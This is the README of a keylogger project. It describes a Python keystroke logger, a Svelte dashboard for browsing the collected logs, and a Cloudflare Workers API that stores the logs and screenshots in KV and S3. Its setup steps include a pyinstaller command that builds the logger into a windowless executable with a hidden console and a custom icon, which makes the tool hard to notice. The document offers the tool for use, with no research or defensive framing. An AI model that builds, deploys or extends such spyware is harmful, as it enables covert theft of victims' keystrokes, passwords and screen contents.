# Keylogger

A simple keylogger written in Python, complemented by a modern web interface to access logs and manage collected data. The project comprises three main components: the keylogger script, a web interface, and a logging API. The API also supports screenshot storage using Cloudflare Workers and KV, with S3 integration for image storage.

## Project Structure

- keylogger/

  - Contains the Python script for logging keystrokes.

- web/

  - A web interface built using Svelte and TypeScript for viewing and managing logs.

- keylogger-api/
  - A logging API written in TypeScript using Cloudflare Workers and KV for data storage.
  - Supports storing screenshot images in S3.

## Setup Instructions

### Keylogger

1. Navigate to the `keylogger` directory:
   ```bash
   cd keylogger
   ```
2. Install the required Python packages:
   ```bash
   pip install -r requirements.txt
   ```
3. Run the keylogger script:
   ```bash
   python logger.py
   ```
4. To generate an executable, run the following command:
   ```bash
   pyinstaller --noconfirm --onefile --windowed --icon "C:\path\to\icon.ico" --hide-console "C:\path\to\logger.py"
   ```
   Replace `C:\path\to\icon.ico` and `C:\path\to\logger.py` with the actual paths to the icon and the logger script.

---

### Web Interface

1. Navigate to the `web` directory:
   ```bash
   cd web
   ```
2. Update the `BASE_URL` in `src/utils/consts.ts` to point to your backend (API) URL.
3. Install dependencies:
   ```bash
   npm install
   ```
4. Start the development server:
   ```bash
   npm run dev
   ```
5. To deploy the frontend on cloudflare pages:
   ```bash
   npm run deploy
   ```

---

### Keylogger API

1. Navigate to the `keylogger-api` directory:
   ```bash
   cd keylogger-api
   ```
2. Fill out the `example.toml` file with the necessary configurations for your environment.
   - Rename it to `wrangler.toml`:
     ```bash
     mv example.toml wrangler.toml
     ```
3. Install dependencies:
   ```bash
   npm install
   ```
4. Start the development server:
   ```bash
   npm run dev
   ```
5. To deploy the backend API on cloudflare workers:
   ```bash
   npm run deploy
   ```
